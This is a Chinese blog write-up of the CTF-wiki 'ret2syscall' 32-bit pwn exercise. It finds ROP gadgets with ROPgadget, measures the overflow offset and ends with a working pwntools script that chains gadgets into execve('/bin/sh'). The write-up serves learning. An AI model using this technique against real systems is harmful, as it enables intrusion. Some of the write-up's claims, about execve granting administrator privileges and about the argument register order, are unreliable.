# CTFWIKI-PWN-ret2syscall

该题目是在32位下

**目录**

[TOC]







## 先进行checksec

## 

## ida



<img src="https://i-blog.csdnimg.cn/blog_migrate/85fe65da1c42e0cebd7b0939f1dde32a.png" alt="" style="max-height:246px; box-sizing:content-box;" />


发现栈溢出函数这次我们学习的是系统调用 执行/bin/sh

这个是通过系统调用函数 就是存放在系统中的函数来执行shellcode

这种类型是没有存在shellcdoe的

我们这次要使用到的函数是

## 1.execve()



类似python中的os.system(cmd) 可以以管理员权限执行函数

这个函数和system()函数的差别就是 会不会返回

```scss
system() 会在执行完后进行返回 完成
```

```scss
execve()在语句执行完后不会返回
```

## 2.寄存器

eax通常使用与存放函数进行传递和进行系统调用



大多数都是运用eax进行系统调用

ebx ecx edx进行参数的传递

我们这个就是运用 这个概念

```undefined
通过eax进行调用系统函数
 
再通过ecx，ebx，edx进行函数的参数传递
 
ecx通常用于传递第一参数，edx用于传递第二参数，ebx用于传递第三参数
 
 
但是要凭借情况而定 这道题就是找到操作进行
```

## 3.我们需要先看看execve()函数的函数调用号

这个是查看所有的函数号



```cobol
cd /usr/include/asm
vim unistd_32.h 
```

这个是直接找execve()的函数号

```cobol
cat /usr/include/asm/unistd_32.h | grep execve 
```

grep是高级搜索 字符串

## 4.使用ROPgadget来查看

### 我们先进行查看eax|ret

来查看 pop eax ret指令

```php
ROPgadget --binary rop --only 'pop|ret' | grep 'eax'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c29779ff85e2d648423c637f7916fc97.png" alt="" style="max-height:194px; box-sizing:content-box;" />


能发现出现了 pop eax ;ret 这就是我们需要的操作 记下他的地址

```cobol
pop_eax_ret=p32(0x080bb196)
```

### 查看 pop ebx,ecx,edx,ret

通过高级搜索 看看 pop ebx,ret的操作

```php
ROPgadget --binary rop --only 'pop|ret' | grep 'ebx'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e553528b54edb2fd88254c8c95238261.png" alt="" style="max-height:728px; box-sizing:content-box;" />


返回来很多 有出现 pop ebx,ret

但是其中还有一个

```perl
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

出现了我们需要的全部 就是顺序不一样 所以这个变为

```undefined
ebx为第一参数 ecx为第二参数 edx 为第三参数
```

```cobol
pop_other_ret=p32(0x0806eb90)
```



这就解释为什么和上面我说一般来说参数的分配不一样 还有为什么流程图/bin/sh在ebx

### 查找 /bin/sh的地址

```php
ROPgadget --binary rop --string '/bin/sh'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c9ebdca94098cc804ebbd44e5a9ac2db.png" alt="" style="max-height:151px; box-sizing:content-box;" />


得到了地址

```cobol
bin_add=p32(0x080be408)
```

### 查找int 0x80

 `int 0x80` 是一种在Linux操作系统中使用的系统调用调用方式，它会触发中断信号并将控制权转移到内核态，在内核中执行相应的系统调用功能。该指令通常用于在用户空间中调用底层内核接口，例如文件操作、进程管理等。

但是现在 这个已经给其他调用方法替代了 存在历史性

```php
ROPgadget --binary rop --only 'int'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/abc5945699a3dada9ff2acd800e0970c.png" alt="" style="max-height:140px; box-sizing:content-box;" />


```cobol
int_add=p32(0x08049421)
```

这样我们就得到了所有的地址

## 5.查看字符偏移量

gdb打开

```cobol
cyclic 200
r
cyclic -l daab
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/d1ec111e651528eddbc112e9e1202a03.png" alt="" style="max-height:445px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/bb8a8b2e1f3727f46365119420fc19cf.png" alt="" style="max-height:130px; box-sizing:content-box;" />




我们开始编写exp

```cobol
from pwn import *
p=process('./rop')
pop_eax_ret=p32(0x080bb196)
pop_other_ret=p32(0x0806eb90)
bin_add=p32(0x080be408)
int_add=p32(0x08049421)
payload=b'A'*112+pop_eax_ret+p32(0xb)+pop_other_ret+p32(0)+p32(0)+bin_add+int_add
p.sendline(payload)
p.interactive()
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6a45cb98f92e433222921f3b1056e49a.png" alt="" style="max-height:513px; box-sizing:content-box;" />


实现了控制器



## 附上流程图



<img src="https://i-blog.csdnimg.cn/blog_migrate/dcf18a0b81c773f0477580b99cc33888.png" alt="" style="max-height:748px; box-sizing:content-box;" />


```scss
execve('/bin/sh',0,0)
```